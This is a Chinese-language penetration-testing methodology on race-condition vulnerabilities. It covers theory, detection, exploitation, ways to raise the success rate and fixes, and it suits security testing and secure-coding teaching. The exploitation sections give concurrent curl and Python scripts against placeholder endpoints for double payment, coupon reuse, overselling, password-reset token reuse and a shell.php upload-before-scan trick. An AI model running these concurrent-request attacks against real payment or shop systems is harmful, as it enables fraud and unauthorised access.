# 竞争条件检测方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的竞争条件漏洞检测与利用方法，帮助发现和利用并发处理设计中的安全缺陷。

## 1.2 适用范围

本文档适用于所有涉及并发操作的 Web 应用、API 系统、金融系统、电商系统等。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 竞争条件漏洞原理

竞争条件（Race Condition）漏洞是指系统在并发处理多个请求时，由于操作执行顺序的不确定性，导致系统行为偏离预期的安全缺陷。

**核心概念**：
- 临界区（Critical Section）
- 检查时刻 - 使用时刻（TOCTOU）
- 原子操作（Atomic Operation）
- 竞态窗口（Race Window）

**本质问题**：
- 并发控制设计不足
- 锁机制缺失或缺陷
- 状态检查与使用分离
- 非原子复合操作

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-362 | 并发资源竞争（竞态条件） |
| CWE-367 | TOCTOU 竞态条件 |
| CWE-820 | 同步缺失 |

## 2.2 竞争条件类型

### 2.2.1 类型 1：读写竞态

```
场景描述：
- 线程 A 读取数据
- 线程 B 修改数据
- 线程 A 使用旧数据

攻击模式：
在检查和使用之间修改数据
```

### 2.2.2 类型 2：写写竞态

```
场景描述：
- 线程 A 写入数据
- 线程 B 写入数据
- 最终状态取决于执行顺序

攻击模式：
并发修改导致状态不一致
```

### 2.2.3 类型 3：检查 - 使用竞态（TOCTOU）

```
场景描述：
- 检查条件是否满足
- 条件满足后执行操作
- 检查和执行之间条件变化

攻击模式：
在检查后、执行前改变条件
```

### 2.2.4 类型 4：双重使用竞态

```
场景描述：
- 资源只能使用一次
- 并发多次使用
- 系统未正确处理

攻击模式：
并发使用单次资源
```

## 2.3 检测方法

### 2.3.1 黑盒检测

**步骤 1：识别候选端点**

```
高风险功能：
- 资金转账/支付
- 优惠券/积分使用
- 限量商品购买
- 密码重置
- 文件上传
- 账户操作
```

**步骤 2：分析请求特征**

```
分析内容：
- 请求参数
- 响应内容
- 状态变化
- 资源消耗
```

**步骤 3：并发请求测试**

```bash
# 方法 1：使用 Turbo Intruder（Burp 扩展）

# Python 脚本示例
from threadpool import ThreadPool

def send_request(param):
    # 发送请求
    return http.post('/api/transfer', {
        'to': 'attacker',
        'amount': 100
    })

# 并发发送 10 个请求
pool = ThreadPool(10)
results = pool.map(send_request, range(10))

# 方法 2：使用 curl 并发

for i in {1..10}; do
    curl -X POST https://target.com/api/transfer \
         -d "to=attacker&amount=100" &
done
wait

# 方法 3：使用自定义脚本

import requests
import threading

def transfer():
    r = requests.post('https://target.com/api/transfer',
                      data={'to': 'attacker', 'amount': 100})
    print(r.text)

threads = []
for i in range(10):
    t = threading.Thread(target=transfer)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

**步骤 4：分析响应差异**

```
分析要点：
- 响应时间差异
- 响应内容差异
- 状态码差异
- 业务结果差异
```

### 2.3.2 白盒检测

**代码审计要点**

```python
# 危险模式 1：非原子检查 - 执行

# ❌ 危险代码
if balance >= amount:  # 检查
    balance -= amount  # 执行
    # 检查和执行之间有竞态窗口

# ✅ 安全代码
with lock:
    if balance >= amount:
        balance -= amount
```

```python
# 危险模式 2：多次读取

# ❌ 危险代码
balance = get_balance()  # 第一次读取
# ... 其他代码可能修改余额 ...
if balance >= amount:  # 使用旧值
    process()

# ✅ 安全代码
with lock:
    balance = get_balance()
    if balance >= amount:
        process()
```

```python
# 危险模式 3：单例模式初始化

# ❌ 危险代码
if instance is None:
    instance = create_instance()

# ✅ 安全代码（双重检查锁定）
with lock:
    if instance is None:
        instance = create_instance()
```

```python
# 危险模式 4：临时文件操作

# ❌ 危险代码
if not os.path.exists('/tmp/file'):
    # 检查和创建之间有竞态
    with open('/tmp/file', 'w') as f:
        f.write(data)

# ✅ 安全代码
fd = os.open('/tmp/file', os.O_CREAT | os.O_EXCL | os.O_WRONLY)
with os.fdopen(fd, 'w') as f:
    f.write(data)
```

## 2.4 利用方法

### 2.4.1 双重支付攻击

```bash
# 场景：账户余额 100 元，并发转账

# 并发请求 1
POST /api/transfer
{"to": "A", "amount": 100}

# 并发请求 2
POST /api/transfer
{"to": "B", "amount": 100}

# 预期结果：只有一个成功
# 漏洞结果：两个都成功，余额变为 -100
```

### 2.4.2 超卖攻击

```bash
# 场景：限量商品 10 件

# 并发 100 个购买请求
for i in {1..100}; do
    curl -X POST https://target.com/api/buy \
         -d "product_id=limited&quantity=1" &
done
wait

# 预期结果：10 个成功，90 个失败
# 漏洞结果：可能超过 10 个成功
```

### 2.4.3 优惠券重复使用

```bash
# 场景：一次性优惠券

# 并发使用同一优惠券
for i in {1..10}; do
    curl -X POST https://target.com/api/checkout \
         -d "coupon=ONCE&amount=100" &
done
wait

# 预期结果：只有一个成功
# 漏洞结果：可能多个成功
```

### 2.4.4 密码重置竞态

```bash
# 场景：密码重置令牌

# 1. 请求密码重置
POST /api/reset/request
{"email": "victim@example.com"}

# 2. 获取令牌（假设令牌可多次使用）
token = "abc123"

# 3. 并发使用令牌
for i in {1..5}; do
    curl -X POST https://target.com/api/reset/confirm \
         -d "token=$token&password=new$i" &
done
wait

# 预期结果：只有一个成功
# 漏洞结果：可能多个成功（最后一次生效）
```

### 2.4.5 文件上传竞态

```bash
# 场景：文件上传后扫描

# 1. 上传恶意文件
POST /api/upload
File: shell.php

# 2. 在杀毒软件扫描前访问
# 上传和扫描之间有窗口
GET /uploads/shell.php

# 3. 并发上传多个文件
# 增加成功概率
```

### 2.4.6 库存回滚竞态

```bash
# 场景：订单取消后库存回滚

# 1. 创建订单（占用库存）
POST /api/order
{"product": 1, "quantity": 5}

# 2. 并发取消订单多次
for i in {1..5}; do
    curl -X POST https://target.com/api/order/cancel \
         -d "order_id=123" &
done
wait

# 预期结果：只回滚一次
# 漏洞结果：可能回滚多次，库存增加
```

## 2.5 绕过方法

### 2.5.1 时间窗口利用

```
技巧：精确计时

1. 测量竞态窗口大小
2. 调整并发请求时机
3. 使用更精确的同步
```

### 2.5.2 增加成功率

```
技巧 1：增加并发数
- 增加并发请求数量
- 提高命中概率

技巧 2：重复尝试
- 多次执行并发攻击
- 累积成功概率

技巧 3：分布式攻击
- 多地点同时发起
- 减少网络延迟差异
```

---

# 第三部分：附录

## 3.1 竞争条件检测检查清单

```
□ 是否识别高风险功能
□ 是否测试并发请求
□ 是否分析响应差异
□ 是否检查业务结果
□ 是否审计相关代码
□ 是否测试 TOCTOU
□ 是否测试双重支付
□ 是否测试超卖场景
□ 是否测试重复使用
□ 是否提供修复建议
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| Burp Suite + Turbo Intruder | 并发请求 | https://portswigger.net/burp |
| Python threading | 自定义脚本 | https://python.org/ |
| Apache Bench (ab) | 压力测试 | https://httpd.apache.org/ |
| wrk | HTTP 基准测试 | https://github.com/wg/wrk |

## 3.3 修复建议

1. **使用锁机制** - 临界区使用互斥锁
2. **原子操作** - 使用数据库原子操作
3. **事务处理** - 使用数据库事务
4. **乐观锁** - 使用版本号控制
5. **队列处理** - 串行化关键操作
6. **唯一约束** - 数据库添加唯一约束
7. **幂等设计** - 操作设计为幂等
8. **监控检测** - 监控异常并发行为

---

**参考资源**：
- [OWASP Race Condition](https://owasp.org/www-community/vulnerabilities/Race_condition)
- [CWE-362: Concurrent Execution using Shared Resource](https://cwe.mitre.org/data/definitions/362.html)
- [PortSwigger - Race Conditions](https://portswigger.net/web-security/race-conditions)
